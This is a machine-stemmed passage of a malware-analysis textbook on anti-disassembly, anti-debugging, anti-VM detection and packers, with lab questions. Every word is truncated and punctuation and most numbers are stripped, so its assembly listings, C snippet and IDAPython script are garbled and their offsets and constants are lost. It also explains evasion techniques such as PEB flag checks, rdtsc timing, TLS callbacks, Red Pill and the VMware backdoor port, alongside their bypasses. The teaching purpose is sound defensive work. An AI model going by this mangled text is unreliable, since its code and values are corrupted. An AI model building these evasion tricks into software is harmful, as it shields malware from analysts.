valuabl malwar analyst allow analysi singl function one time enabl analyst better understand input output construct howev analyz function determin construct stack frame exact scienc mani facet disassembl algorithm use determin construct stack frame must make certain assumpt guess reason usual exploit knowledg malwar author defeat stackfram analysi also prevent oper certain analyt techniqu notabl hexray decompil plugin ida pro produc clike pseudocod function let begin examin function armor defeat stackfram analysi exampl function defeat stackfram analysi sub proc near code xref subdcp subbp argf dword ptr fh argf dword ptr fch sub esp sub esp c cmp esp h f c jl short loc c add esp jmp short locc loc code xref subcj c add esp h c c locc code xref subj c f mov espfhargf eh f lea eax espfhargf f mov espfhargf eax b f mov edx espfhargf e f mov eax espfhargf f inc eax f mov edx eax f mov eax espfhargf f mov eax eax f add esp retn sub endp spanalysi fail stackfram antianalysi techniqu depend heavili compil use cours malwar entir written assembl author free use unorthodox techniqu howev malwar craft higher level languag c c special care must taken output code manipul exampl column far left standard ida pro line prefix contain segment name memori address function next column right display stack pointer instruct stack pointer column show valu esp regist rel begin function view show function espbas stack frame rather ebpbas one like function stack pointer column enabl ida pro option menu stack pointer begin shown neg number never happen ordinari function mean function could damag call function stack frame list ida pro also tell us think function take argument think actual use note press ctrl k ida pro examin monstrou stack frame detail attempt press give function prototyp youll present one ghastli abomin function prototyp youv ever seen may guess function doesnt actual take argument realiti take argument two local variabl code respons break ida pro analysi lie near begin function locat c simpl comparison two branch esp regist compar valu x less x execut code otherwis execut code branch add valu espx lessthanbranch greaterthanorequalto branch disassembl perspect two possibl valu stack pointer offset point depend branch taken disassembl forc make choic luckili malwar author trick make wrong choic earlier discuss condit branch instruct condit exist condit constant jz instruct immedi follow xor eax eax instruct innov disassembl author could code special semant algorithm track guarante flag state detect presenc fake condit branch code would use mani scenario would straightforward though cumbersom implement exampl instruct cmp esp h alway produc fix result experienc malwar analyst might recogn lowest memori page window process would use stack thu comparison virtual guarante alway result greaterthanorequalto branch execut disassembl program doesnt level intuit job show instruct design evalu everi decis code set realworld scenario crux problem disassembl assum add esp h instruct valid relev adjust interpret stack accordingli add esp instruct greaterthanorequalto branch sole readjust stack sub esp instruct came comparison net result real time esp valu ident prior begin sequenc address overcom minor adjust stack frame occur occasion due inher fallibl natur stackfram analysi ida pro put cursor particular line disassembl press alt k enter adjust stack pointer mani case exampl may prove fruit patch stackfram manipul instruct previou examplesconclus antidisassembl confin techniqu discuss chapter class techniqu take advantag inher difficulti analysi advanc program modern disassembl excel job determin instruct constitut program still requir assumpt choic made process choic assumpt made disassembl may correspond antidisassembl techniqu chapter show disassembl work linear flowori disassembl strategi differ antidisassembl difficult flow orient disassembl still quit possibl understand disassembl make certain assumpt code execut mani antidisassembl techniqu use flowori disassembl oper craft condit flowcontrol instruct condit alway runtim unknown disassembl obscur flow control way malwar caus malwar analyst overlook portion code hide function purpos obscur relat function system call examin sever way accomplish rang use ret instruct use seh handler generalpurpos jump goal chapter help understand code tactic perspect learn type techniqu work use defeat encount field techniqu wait discov invent solid foundat prepar wage war antidisassembl battlefield futurelab lab analyz sampl found file labex commandlin program take argument print good job argument match secret code question q antidisassembl techniqu use binari q rogu opcod disassembl trick disassembl q mani time techniqu use q commandlin argument caus program print good job lab analyz malwar found file labex correct antidisassembl countermeasur analyz binari order answer question question q url initi request program q userag gener q program look page initi request q program inform extract page lab analyz malwar found file labex first glanc binari appear legitim tool actual contain function advertis question q malici code initi calledq malici code q url malwar use q filenam malwar usechapt antidebug antidebug popular antianalysi techniqu use malwar recogn control debugg thwart debugg malwar author know malwar analyst use debugg figur malwar oper author use antidebug techniqu attempt slow analyst much possibl malwar realiz run debugg may alter normal code execut path modifi code caus crash thu interf analyst attempt understand ad time addit overhead effort mani antidebug techniquesperhap hundr themand well discuss popular one encount real world present way bypass antidebug techniqu overal goal chapter besid introduc specif techniqu help develop skill youll need overcom new previous unknown anti debug method analysi window debugg detect malwar use varieti techniqu scan indic debugg attach includ use window api manual check memori structur debug artifact search system residu left debugg debugg detect common way malwar perform anti debug use window api use window api function obviou antidebug techniqu window api provid sever function use program determin debug function design debugg detect other design differ purpos repurpos detect debugg function use function document api typic easiest way overcom call antidebug api function isto manual modifi malwar execut call function modifi flag post call ensur proper path taken difficult option would hook function rootkit follow window api function use antidebug isdebuggerpres simplest api function detect debugg isdebuggerpres function search process environ block peb structur field isdebug return zero run context debugg nonzero valu debugg attach well discuss peb structur detail next section checkremotedebuggerpres api function nearli ident isdebuggerpres name mislead though check debugg remot machin rather process local machin also check peb structur isdebug field howev anoth process local machin function take process handl paramet check process debugg attach checkremotedebuggerpres use check process simpli pass handl process ntqueryinformationprocess nativ api function ntdlldll retriev inform given process first paramet function process handl second use tell function type process inform retriev exampl use valu processdebugport valu x paramet tell process question current debug process debug zero return otherwis port number return outputdebugstr function use send string debugg display use detect presenc debugg exampl exampl use setlasterror set current error code arbitrari valu outputdebugstr call debugg attachedgetlasterror longer contain arbitrari valu error code set outputdebugstr function fail outputdebugstr call debugg attach call outputdebugstr succeed valu getlasterror chang exampl outputdebugstr antidebug techniqu dword errorvalu setlasterrorerrorvalu outputdebugstringtest debugg ifgetlasterror errorvalu exitprocess els runmaliciouspayload manual check structur use window api may obviou method detect presenc debugg manual check structur common method use malwar author mani reason malwar author discourag use window api antidebug exampl api call could hook rootkit return fals inform therefor malwar author often choos perform function equival api call manual rather reli window api perform manual check sever flag within peb structur provid inform presenc debugg well look commonli use flag check debugg check beingdebug flag window peb structur maintain os run process shown exampl exampl contain usermod paramet associ process paramet includ processs environ data includ environ variabl load modul list address memori debugg statusexampl document process environ block peb structur typedef struct peb byte reserv byte beingdebug byte reserv pvoid reserv ppebldrdata ldr prtluserprocessparamet processparamet byte reserv pvoid reserv ppspostprocessinitroutin postprocessinitroutin byte reserv pvoid reserv ulong sessionid peb ppeb process run locat peb referenc locat fsh antidebug malwar use locat check beingdebug flag indic whether specifi process debug tabl show two exampl type check tabl manual check beingdebug flag mov method push pop method mov eax dword ptr fsh mov ebx byte ptr eax test ebx ebx jz nodebuggerdetect push dword ptr fsh pop edx cmp byte ptr edx je debuggerdetect code left tabl locat peb move eax next offset plu move ebx correspond offset peb locat beingdebug flag final ebx check see zero debugg attach jump taken anoth exampl shown right side tabl locat peb move edx use pushpop combin instruct beingdebug flag offset directli compar check take mani form ultim condit jump determin code path take one follow approach surmount problem forc jump taken manual modifi zero flag immedi jump instruct execut easiestapproach manual chang beingdebug flag zero option gener effect techniqu describ section note number ollydbg plugin chang beingdebug flag popular hide debugg hidedebug phantom use overcom beingdebug flag check also help mani techniqu discuss chapter check processheap flag undocu locat within reserv array shown exampl known processheap set locat processs first heap alloc loader processheap locat x peb structur first heap contain header field use tell kernel whether heap creat within debugg known forceflag flag field offset x heap header forceflag field window xp window offset x bit applic malwar may also look offset xc window xp offset x window flag field field almost alway equal forceflag field usual ore valu exampl show assembl code techniqu note two separ derefer must occur exampl manual processheap flag check mov eax larg fsh mov eax dword ptr eaxh cmp dword ptr dseaxh jne debuggerdetect best way overcom techniqu chang processheap flag manual use hidedebug plugin debugg use windbg start program debug heap disabl exampl command windbg hd notepadex start heap normal mode oppos debug mode flag weve discuss wont setcheck ntglobalflag sinc process run slightli differ start debugg creat memori heap differ inform system use determin creat heap structur store undocu locat peb offset x valu locat x know run debugg valu x combin follow flag heap creat debugg flag set process start within debugg flgheapenabletailcheck flgheapenablefreecheck flgheapvalidateparamet exampl show assembl code perform check exampl ntglobalflag check mov eax larg fsh cmp dword ptr dseaxh h jz debuggerdetect easiest way overcom techniqu chang flag manual hidedebug plugin debugg use windbg start program debug heap option disabl mention previou section check system residu analyz malwar typic use debug tool leav residu system malwar search residu order determin attempt analyz search registri key refer debugg follow common locat debugg hkeylocalmachinesoftwaremicrosoftwindow ntcurrentversionaedebug registri key specifi debugg activ applic error occur default set dr watson chang someth like ollydbg malwar may determin microscop malwar also search system file directori common debugg program execut typic present malwar analysi mani backdoor alreadi code place travers filesystem orth malwar detect residu live memori view current process list commonli perform findwindow search debugg shown exampl exampl c code findwindow detect findwindow ollydbg null debugg found els debugg detect exampl code simpli look window name ollydbg identifi debugg behavior recal debugg use set breakpoint singlestep process order aid malwar analyst reverseengin howev oper perform debugg modifi code process sever antidebug techniqu use malwar detect sort debugg behavior int scan checksum check time check int scan int softwar interrupt use debugg temporarili replac instruct run program call debug except handlera basic mechan set breakpoint opcod int xcc whenev use debugg set breakpoint modifi code insert xcc addit specif int instruct int immedi set interrupt includ immedi regist eax int immedi instruct use two opcod xcd valu byte opcod less commonli use debugg one common antidebug techniqu process scan code int modif search code xcc opcod shown exampl exampl scan code breakpoint call pop edi sub edi mov ecx h mov eax cch repn scasb jz debuggerdetect code begin call follow pop put eip edi edi adjust start code code scan xcc byte xcc byte found know debugg present techniqu overcom use hardwar breakpoint instead softwar breakpoint perform code checksum malwar calcul checksum section code accomplish samego scan interrupt instead scan xcc check simpli perform cyclic redund check crc md checksum opcod malwar techniqu less common scan equal effect look malwar iter intern instruct follow comparison expect valu techniqu overcom use hardwar breakpoint manual modifi execut path debugg runtim time check time check one popular way malwar detect debugg process run slowli debug exampl singl step program substanti slow execut speed coupl way use time check detect debugg record timestamp perform coupl oper take anoth timestamp compar two timestamp lag assum presenc debugg take timestamp rais except process debug except handl realli quickli debugg handl except much slowli default debugg requir human intervent order handl except caus enorm delay mani debugg allow ignor except pass program still sizabl delay case use rdtsc instruct common time check method use rdtsc instruct opcod xf return count number tick sinc last system reboot bit valu place edxeax malwar simpli execut instruct twice compar differ two read exampl show real malwar sampl use rdtsc techniqu exampl rdtsc time techniqu rdtsc xor ecx ecxadd ecx eax rdtsc sub eax ecx cmp eax xfff jb nodebuggerdetect rdtsc push eax ret malwar check see differ two call rdtsc greater xfff much time elaps condit jump taken jump taken rdtsc call result push onto stack caus return take execut random locat use queryperformancecount gettickcount two window api function use like rdtsc order perform anti debug time check method reli fact processor high resolut perform countersregist store count activ perform processor queryperformancecount call queri counter twice order get time differ use comparison much time pass two call assumpt debugg use function gettickcount return number millisecond elaps sinc last system reboot due size alloc counter roll day exampl gettickcount practic shown exampl exampl gettickcount time techniqu gettickcount maliciousactivityfunct b gettickcount delta ba delta xa debugg detect els debugg found time attack weve discuss found debug staticanalysi identifi two success call function follow comparison check catch debugg singlestep set breakpoint two call use captur time delta therefor easiest way avoid detect time run check set breakpoint start singlestep option simpli modifi result comparison forc jump want takeninterf debugg function malwar use sever techniqu interfer normal debugg oper thread local storag tl callback except interrupt insert techniqu tri disrupt program execut control debugg use tl callback might think load program debugg paus first instruct program execut alway case debugg start program entri point defin pe header tl callback use execut code entri point therefor execut secretli debugg reli use debugg could miss certain malwar function tl callback run soon load debugg tl window storag class data object automat stack variabl yet local thread run code basic tl allow thread maintain differ valu variabl declar use tl tl implement execut code typic contain tl section pe header shown figur tl support callback function initi termin tl data object window execut function run code normal start programfigur tl callback examplea tl tabl peview tl callback discov view tl section use peview immedi suspect antidebug see tl section normal program typic use section analysi tl callback easi ida pro ida pro finish analysi view entri point binari press ctrl e display entri point program includ tl callback shown figur tl callback function label prepend tlscallback brows callback function ida pro doubleclick function name figur view tl callback function ida pro press ctrl e displaytl callback handl within debugg though sometim debugg run tl callback break initi entri point avoid problem chang debugg set exampl your use ollydbg paus tl callback select option debug option event set system breakpoint place first paus shown figur note ollydbg break capabl version exampl paus start tl callback also windbg alway break system breakpoint tl callback figur ollydbg first paus option tl callback well known malwar use less frequent past mani legitim applic use tl callback tl section execut stand use except discuss earlier interrupt gener except use debugg toperform oper like breakpoint chapter learn set seh achiev unconvent jump modif seh chain appli antidisassembl antidebug section skip seh specif sinc address chapter focu way except use hamper malwar analyst except use disrupt detect debugg exceptionbas detect reli fact debugg trap except immedi pass process debug handl default set debugg trap except pass program debugg doesnt pass except process properli failur detect within process exceptionhandl mechan figur show ollydbg default set except trap unless box check option access via option debug option except figur ollydbg except process option note perform malwar analysi recommend set debug option pass except programinsert interrupt classic form antidebug use except annoy analyst disrupt normal program execut insert interrupt middl valid instruct sequenc depend debugg set insert could caus debugg stop sinc mechan debugg use set softwar breakpoint insert int int use debugg set softwar breakpoint one anti debug techniqu consist insert xcc opcod valid section code order trick debugg think opcod breakpoint debugg track set softwar breakpoint order avoid fall trick byte opcod sequenc xcd also use gener int often valid way malwar interfer windbg outsid debugg xcd gener statusbreakpoint except howev insid windbg catch breakpoint silent advanc eip exactli byte sinc breakpoint normal xcc opcod caus program execut differ set instruct debug windbg versu run normal ollydbg vulner interfer use byte int attack exampl show assembl code implement techniqu exampl set new seh call int forc code continu exampl int techniqu push offset continu push dword fs mov fs esp int debug continu debug insert int int antidebug techniqu function like int int xd instruct use access kernel debugg int xd way thatkernel debugg set breakpoint method shown list appli insert ice one intel undocu instruct incircuit emul ice breakpoint icebp opcod xf instruct design make easier debug use ice difficult set arbitrari breakpoint ice execut instruct gener singlestep except program trace via singlestep debugg think normal except gener singlestep execut previous set except handler malwar take advantag use except handler normal execut flow would disrupt case order bypass techniqu singlestep icebp instructiondebugg vulner like softwar debugg contain vulner sometim malwar author attack order prevent debug present sever popular vulner way ollydbg handl pe format pe header vulner first techniqu modifi microsoft pe header binari execut caus ollydbg crash load execut result error bad unknown bit execut file yet program usual run fine outsid debugg issu due fact ollydbg follow microsoft specif regard pe header strictli pe header typic structur known imageoptionalhead figur show subset structur figur pe imageoptionalhead numberofrvaands vulner last sever element structur particular interest numberofrvaands field identifi number entri thedatadirectori array follow datadirectori array indic find import execut compon file littl array imagedatadirectori structur end option header structur data directori structur specifi size rel virtual address directori size array set imagenumberofdirectoryentri equal x window loader ignor numberofrvaands greater x anyth larger fit datadirectori array ollydbg follow standard use numberofrvaands matter consequ set size array valu greater x like x caus ollydbg gener popup window user exit program easiest way overcom techniqu manual modifi pe header set numberofrvaands x use hex editor pe explor cours use debugg vulner techniqu windbg ollydbg anoth pe header trick involv section header caus ollydbg crash load error file contain much data windbg ollydbg vulner techniqu section contain content file includ code data resourc inform section header form imagesectionhead structur figur show subset structur figur pe imagesectionhead structur element interest virtuals sizeofrawdata accord window pe specif virtuals contain total size thesect load memori sizeofrawdata contain size data disk window loader use smaller virtuals sizeofrawdata map section data memori sizeofrawdata larger virtuals virtuals data copi memori rest ignor ollydbg use sizeofrawdata set sizeofrawdata someth larg like x caus ollydbg crash easiest way overcom antidebug techniqu manual modifi pe header set sizeofrawdata use hex editor chang valu close virtuals note accord specif valu must multipl filealign valu imageoptionalhead pe explor great program use purpos fool larg valu sizeofrawdata outputdebugstr vulner malwar often attempt exploit format string vulner version ollydbg provid string paramet outputdebugstr caus ollydbg crash bewar suspici call like outputdebugstr ssssssssssssss call execut debugg crashconclus chapter introduc popular antidebug techniqu take patienc persever learn recogn bypass antidebug techniqu sure take note analysi rememb locat antidebug techniqu bypass help need restart debug process antidebug techniqu spot use common sens debug process slowli exampl see code termin prematur condit jump might hint antidebug techniqu popular antidebug techniqu involv access fsh call window api call perform time check cours malwar analysi best way learn thwart anti debug techniqu continu revers studi malwar malwar author alway look new way thwart debugg keep malwar analyst like toeslab lab analyz malwar found labex use debugg malwar labex ad antidebug techniqu question q antidebug techniqu malwar employ q happen antidebug techniqu succe q get around antidebug techniqu q manual chang structur check runtim q ollydbg plugin protect antidebug techniqu use malwar lab analyz malwar found labex use debugg goal lab figur correct password malwar drop malici payload question q happen run labex command line q happen run labex guess commandlin paramet q commandlin password q load labex ida pro main function strncmp found q happen load malwar ollydbg use default set q uniqu pe structur labex q callback locat hint use ctrl e ida pro q antidebug techniqu program use termin immedi debugg avoid checkq commandlin password see debugg disabl antidebug techniqu q password found debugg work command line q antidebug techniqu account differ password debugg command line protect lab analyz malwar labex use debugg malwar similar labex certain modif includ introduct anti debug techniqu get stuck see lab solut question q string see use static analysi binari q happen run binari q must renam sampl order run properli q antidebug techniqu malwar employ q techniqu malwar determin run debugg q antidebug techniqu success malwar q domain name malwar usechapt antivirtu machin techniqu malwar author sometim use antivirtu machin antivm techniqu thwart attempt analysi techniqu malwar attempt detect whether run insid virtual machin virtual machin detect act differ simpli run cours caus problem analyst antivm techniqu commonli found malwar wide deploy bot scarewar spywar mostli honeypot often use virtual machin malwar typic target averag user machin unlik run virtual machin popular antivm malwar go recent attribut great increas usag virtual tradit malwar author use antivm techniqu thought analyst would run malwar virtual machin howev today administr user use virtual machin order make easi rebuild machin rebuild tediou process virtual machin save time allow go back snapshot malwar author start realiz machin virtual machin necessarili mean isnt valuabl victim virtual continu grow antivm techniqu probabl becom even less common antivm techniqu typic target vmware chapter well focu antivmwar techniqu well examin common techniqu defeat tweak coupl set remov softwar patch execut vmware artifact vmware environ leav mani artifact system especi vmware tool instal malwar use artifact present filesystem registri process list detect vmwarefor exampl figur show process list standard vmware imag vmware tool instal notic three vmware process run vmwareserviceex vmwaretrayex vmwareuserex one found malwar search process list vmware string figur process list vmware imag vmware tool run vmwareserviceex run vmware tool servic child servicesex identifi search registri servic instal machin list servic use follow command c net start findstr vmware vmware physic disk helper servic vmware tool servic vmware instal directori cprogram filesvmwarevmwar tool may also contain artifact registri quick search vmware virtual machin registri might find key like follow entri includ inform virtual hard drive adapt virtual mousehkeylocalmachinehardwaredevicemapscsiscsi port scsi bu target id logic unit id identifiervmwar virtual ide hard drive typediskperipher hkeylocalmachinesoftwaremicrosoftwindowscurrentversionreinstal devicedescvmwar acceler amd pcnet adapt displaynamevmwar acceler amd pcnet adapt mfgvmware inc providernamevmwar inc hkeylocalmachinesystemcontrolsetcontrolclassdefecebfc locationinformationoverrideplug ps mous port infpathoeminf infsectionvmmous providernamevmwar inc discuss chapter connect virtual machin network varieti way allow virtual machin virtual network interfac card nic vmware must virtual nic need creat mac address virtual machin depend configur network adapt also identifi vmware usag first three byte mac address typic specif vendor mac address start c associ vmware vmware mac address typic chang version version malwar author need check virtual machin mac address vmware valu malwar also detect vmware hardwar motherboard see malwar check version hardwar might tri detect vmware look code check mac address hardwar version patch code avoid check common vmware artifact easili elimin uninstal vmware tool tri stop vmware tool servic follow command net stop vmware tool servic may also abl prevent malwar search artifact exampl find singl vmwarerel string malwaresuch net start findstr vmware vmmous vmwaretrayex vmware virtual ide hard drive know malwar attempt detect vmware artifact abl find code easili ida pro use refer thestr find patch avoid detect ensur malwar function properli bypass vmware artifact search defeat malwar search vmware artifact often simpl twostep process identifi check patch exampl say run string malwar vmtex notic binari contain string vmwaretrayex discov crossrefer code string follow crossrefer x shown disassembl exampl exampl disassembl snippet vmtex show vmware artifact detect call ds createtoolhelpsnapshot lea ecx ebpprocessentri mov ebx eax b push ecx lppe c push ebx hsnapshot mov ebpprocessentrydws ch call dsprocessfirstw mov esi dswidechartomultibyt mov edi dsstrncmp lea esp esp loc code xref subbj push lpuseddefaultchar push lpdefaultchar push h cbmultibyt lea edx ebpstr f push edx lpmultibytestr push ffffffffh cchwidechar lea eax ebpprocessentryszexefil push eax lpwidecharstr push dwflag b push codepag call esi widechartomultibyt f lea eax ebpstr lea edx eax loc code xref subdj mov cl eax inc eax b test cl cl jnz short loc f sub eax edx push eax maxcount lea ecx ebpstr push offset str vmwaretrayex push ecx str e call edi strncmp add esp ch test eax eaxa jz short locc lea edx ebpprocessentri ad push edx lppe ae push ebx hsnapshot af call ds processnextw b test eax eax b jnz short loc c locc code xref subaj c push code c call dsexit analyz code notic scan process list function like createtoolhelpsnapshot processnext strncmp compar vmwaretrayex string result convert processentryszexefil ascii determin process name process list vmwaretrayex discov process list program immedi termin seen xc coupl way avoid detect patch binari debug jump xa never taken use hex editor modifi vmwaretrayex string read xxxaretrayex make comparison fail sinc valid process string uninstal vmware tool vmwaretrayex longer run check memori artifact vmware leav mani artifact memori result virtual process critic processor structur either move chang virtual machin leav recogniz footprint one techniqu commonli use detect memori artifact search physic memori string vmware found may detect sever hundr instancesvulner instruct virtual machin monitor program monitor virtual machin execut run host oper system present guest oper system virtual platform also coupl secur weak allow malwar detect virtual note x instructionrel issu virtual machin discuss section origin outlin usenix paper analysi intel pentium abil support secur virtual machin monitor john robin cynthia irvin kernel mode vmware use binari translat emul certain privileg instruct kernel mode interpret emul dont run physic processor convers user mode code run directli processor nearli everi instruct interact hardwar either privileg gener kernel trap interrupt vmware catch interrupt process virtual machin still think regular machin instruct x access hardwarebas inform dont gener interrupt includ sidt sgdt sldt cpuid among other order virtual instruct properli vmware would need perform binari translat everi instruct kernelmod instruct result huge perform hit avoid huge perform hit fullinstruct emul vmware allow certain instruct execut without properli virtual ultim mean certain instruct sequenc return differ result run vmware nativ hardwar processor use certain key structur tabl load differ offset side effect lack full translat interrupt descriptor tabl idt data structur intern cpu use oper system determin correct respons interrupt except x memori access pass either global descriptor tabl gdt local descriptor tabl ldt tabl contain segment descriptor provid access detail segment includ base address type length access right idt idtr gdt gdtr ldt ldtr internalregist contain address size respect tabl note oper system need util tabl exampl window implement flat memori model use gdt default use ldt three sensit instruct sidt sgdt sldt read locat tabl store respect regist memori locat instruct typic use oper system privileg x architectur execut user space x processor three regist store locat three tabl therefor regist must contain valu valid underli host oper system diverg valu expect virtual guest oper system sinc sidt sgdt sldt instruct invok time usermod code without trap properli virtual vmware use detect presenc use red pill antivm techniqu red pill antivm techniqu execut sidt instruct grab valu idtr regist virtual machin monitor must reloc guest idtr avoid conflict host idtr sinc virtual machin monitor notifi virtual machin run sidt instruct idtr virtual machin return red pill test discrep detect usag vmware exampl show red pill might use malwar exampl red pill malwar push ebp mov ebp esp sub esp h push ebx push esi push edi push size push val lea eax ebpdst push eax dst call memset add esp ch lea eax ebpdst sidt fword ptr eax mov al eax cmp al ffh jnz short loce malwar issu sidt instruct store content idtr memori locat point eax idtr byte fifth byte offset contain start base memori address fifth byte compar xff vmware signatur red pill succe singleprocessor machin wont work consist multicor processor processor guest host idt assign therefor result sidt instruct vari signatur use red pill unreli thwart techniqu run multicor processor machin simpli nopout sidt instruct use pill techniqu sgdt sldt instruct techniqu vmware detect commonli known pill unlik red pill pill reli fact ldt structur assign processor oper system window normal use ldt structur vmware provid virtual support tabl differ predict ldt locat host machin zero virtual machin nonzero simpl check zero result sldt instruct trick sldt method subvert vmware disabl acceler select vm set processor check disabl acceler box pill solv acceler issu use smsw instruct sldt method fail method involv inspect undocu highord bit return smsw instruct queri io commun port perhap popular antivmwar techniqu current use queri io commun port techniqu frequent encount worm bot storm worm phatbot vmware use virtual io port commun virtual machin host oper system support function like copi past betweenth two system port queri compar magic number identifi use vmware success techniqu depend x instruct copi data io port specifi sourc operand memori locat specifi destin operand vmware monitor use instruct captur io destin commun channel port x vx therefor second operand need load vx order check vmware happen eax regist load magic number xd vmxh ecx must load valu correspond action wish perform port valu xa mean get vmware version type x mean get memori size use detect vmware xa popular may determin vmware version phatbot also known agobot botnet simpl use one featur builtin support io commun port techniqu shown exampl exampl phatbot vmware detect fa push eax fb push ebx fc push ecx fd push edx fe mov eax vmxh mov ebx ebpvarc mov ecx xa mov dx vx e eax dx f mov ebpvar eax mov ebpvarc ebx mov ebpvar ecx mov ebpvar edx e mov eax ebpvarc cmp eax vmxh jnz short locc malwar first load magic number xd vmxh eax regist next load local variabl varc ebx memori address return repli vmware ecx load valu xa get vmware version type x vx load dx use follow instruct specifi vmware io commun port upon execut instruct trap virtual machin emulatedto execut instruct use paramet eax magic valu ecx oper ebx return inform magic valu match vmxh code run virtual machin virtual machin monitor echo back memori locat specifi ebx regist check determin whether code run virtual machin sinc get version type option select ecx regist contain type vmware express esx gsx workstat easiest way overcom techniqu nopout instruct patch condit jump allow regardless outcom comparison use str instruct str instruct retriev segment selector task regist point task state segment tss current execut task malwar author use str instruct detect presenc virtual machin sinc valu return instruct may differ virtual machin versu nativ system techniqu work multiprocessor hardwar figur show str instruct x malwar known sngex load tss byte var var label ida pro two comparison made xa x determin vmware detect antivm x instruct weve review common instruct use malwar employ antivm techniqu instruct follow sidt sgdt sldt smsw str second operand set vx cpuid malwar typic run instruct unless perform vmware detect avoid detect easi patch binari avoid call instruct instruct basic useless execut user mode see theyr like part antivmwar code vmware describ roughli instruct virtualiz preced commonli use malwar highlight antivm ida pro search instruct list previou section ida pro use idapython script shown exampl script look instruct highlight red print total number antivm instruct found ida output window figur show partial result run script sngex one locat str x highlight bar examin highlight code ida pro allow quickli see instruct found involv antivm techniqu investig show str instruct use detect vmwarefigur str antivm techniqu sngex exampl ida pro script find antivm instruct idautil import idc import head headssegstartscreenea segendscreenea antivm head getmnemi sidt getmnemi sgdt getmnemi sldt getmnemi smsw getmnemi str getmnemi orgetmnemi cpuid antivmappendi print number potenti antivm instruct lenantivm antivm setcolori cicitem xff messageantivm xn use scoopyng scoopyng httpwwwtrapkitd free vmware detect tool implement seven differ check virtual machin follow first three check look sidt sgdt sldt red pill pill instruct fourth check look str fifth sixth use backdoor io port xa x option respect seventh check reli bug older vmware version run emul mode disassembl version scoopyng fourth check see figur tweak set discuss number way thwart vmware detect throughout chapter includ patch code remov vmware tool chang vmware set use multiprocessor machin also number undocu featur vmware help mitig antivmwar techniqu exampl place option exampl virtual machin vmx file make virtual machin less detect exampl vmware vmx file undocu option use thwart antivm techniqu isolationtoolsgetptrlocationdis true isolationtoolssetptrlocationdis true isolationtoolssetversiondis true isolationtoolsgetversiondis true monitorcontroldisabledirectexec true monitorcontroldisablechksimd true monitorcontroldisablentreloc true monitorcontroldisableselfmod true monitorcontroldisablereloc true monitorcontroldisablebtinout true monitorcontroldisablebtmemspac true monitorcontroldisablebtpriv true monitorcontroldisablebtseg true directexec paramet caus usermod code emul instead run directli cpu thu thwart certain antivm techniqu first four set use vmware backdoor command vmware tool run guest get inform host chang protect scoopyng check sixth run multiprocessor machin howev recommend use set vmware disabl use vmware tool may seriou neg effect perform virtual machin add option youv exhaust techniqu techniqu mention complet modifi vmx file tri catch ten potenti hundr way vmware might detect bit wildgoos chaseescap virtual machin vmware vulner exploit crash host oper system even run code mani public vulner found vmware share folder featur tool exploit draganddrop function vmware tool one well public vulner use share folder allow guest write file host oper system order modifi compromis host oper system although particular techniqu doesnt work current version vmware sever differ flaw discov share folder featur disabl share folder virtual machin set prevent type attack anoth wellpublic vulner found virtual machin display function vmware exploit vulner known cloudburst publicli avail part canva penetrationtest tool vulner also patch vmware certain publicli avail tool assist exploit vmware host infect includ vmchat vmcat vmftp vmdragnhack vmdragn sploit tool littl use escap virtual machin shouldnt need worri malwar run virtual machineconclus chapter introduc popular antivmwar techniqu malwar author use techniqu slow analysi import abl recogn explain techniqu detail find disassembl debug weve explor way overcom without need modifi malwar disassembl level perform basic dynam analysi alway use virtual machin howev subject malwar doesnt seem run consid tri anoth virtual machin vmware tool uninstal debug disassembl malwar search virtual machin detect might also run subject malwar differ virtual environ like virtualbox parallel even physic machin antidebug techniqu antivm techniqu spot use common sens slowli debug process exampl see code termin prematur condit jump may result antivm techniqu alway awar type issu look ahead code determin action takelab lab analyz malwar found labex insid vmware malwar labex ad antivmwar techniqu note antivm techniqu found lab may work environ question q antivm techniqu malwar use q commerci version ida pro run ida python script exampl chapter provid findantivmpi find q happen antivm techniqu succe q antivm techniqu work virtual machin q antivm techniqu work fail q could disabl antivm techniqu get malwar run lab analyz malwar found file labdll insid vmware answer first question lab tri run instal export use rundllex monitor tool like procmon follow exampl command line execut dll rundllex labdllinstallrt installsainstallsb question q export dll q happen attempt instal use rundllex q file creat contain q method antivm useq could forc malwar instal runtim q could perman disabl antivm techniqu q instal export function work lab analyz malwar labex insid vmware lab similar lab exe ad antivmwar techniqu question q happen run malwar virtual machin q could get malwar run drop keylogg q antivm techniqu malwar use q system chang could make perman avoid antivm techniqu use malwar q could patch binari ollydbg forc antivm techniqu perman failchapt packer unpack pack program known packer becom extrem popular malwar writer help malwar hide antiviru softwar complic malwar analysi shrink size malici execut packer easi use freeli avail basic static analysi isnt use pack program pack malwar must unpack analyz static make analysi complic challeng packer use execut two main reason shrink program thwart detect analysi even though wide varieti packer follow similar pattern transform execut creat new execut store transform execut data contain unpack stub call os begin chapter background inform packer work recogn discuss unpack strategi start simpl one move strategi progress complic packer anatomi malwar pack analyst typic access pack file examin origin unpack program program pack malwar order unpack execut must undo work perform packer requir understand packer oper packer take execut file input produc execut file output pack execut compress encrypt otherwis transform make harder recogn reverseengin packer use compress algorithm compress origin execut packer design make file difficult analyz may encrypt origin execut employ antireverseengin techniqu anti disassembl antidebug antivm packer pack entir executableinclud data resourc section pack code data section maintain function origin program pack program need store program import inform inform store format sever common strategi cover depth later chapter unpack program reconstruct import section sometim challeng timeconsum necessari analyz program function unpack stub nonpack execut load os pack program unpack stub load os unpack stub load origin program code entri point execut point unpack stub rather origin code origin program gener store one extra section file unpack stub view malwar analyst understand differ part stub fundament unpack execut unpack stub often small sinc contribut main function program function typic simpl unpack origin execut attempt perform static analysi pack program analyz stub origin program unpack stub perform three step unpack origin execut memori resolv import origin execut transfer execut origin entri point oep load execut regular execut load loader read pe header disk alloc memori execut section base header loader copi section alloc space memori pack execut also format pe header loader alloc space section come origin program unpack stub creat section unpack stub unpack code section andcopi space alloc exact unpack method use depend goal packer gener contain within stub resolv import discuss chapter nonpack pe file includ section tell loader function import anoth section store address name import function window loader read import inform determin function need fill address window loader read import inform pack pack execut unpack stub resolv import specif approach depend packer common approach unpack stub import loadlibrari getprocaddress function unpack stub unpack origin execut read origin import inform call loadlibrari librari order load dll memori use getprocaddress get address function anoth approach keep origin import tabl intact window loader load dll import function simplest approach sinc unpack stub need resolv import howev static analysi pack program reveal origin import approach lack stealth addit sinc import function store plaintext execut compress possibl approach optim third approach keep one import function dll contain origin import tabl approach reveal one function per import librari analysi stealthier previou approach analysi still reveal librari import approach simpler packer implement first approach sinc librari need load unpack stub unpack stub must still resolv major function final approach remov import includ loadlibrari andgetprocaddress packer must find function need librari without use function must find loadlibrari getprocaddress use locat librari process discuss chapter similar shellcod must benefit approach pack program includ import make stealthi howev order use approach unpack stub must complex tail jump 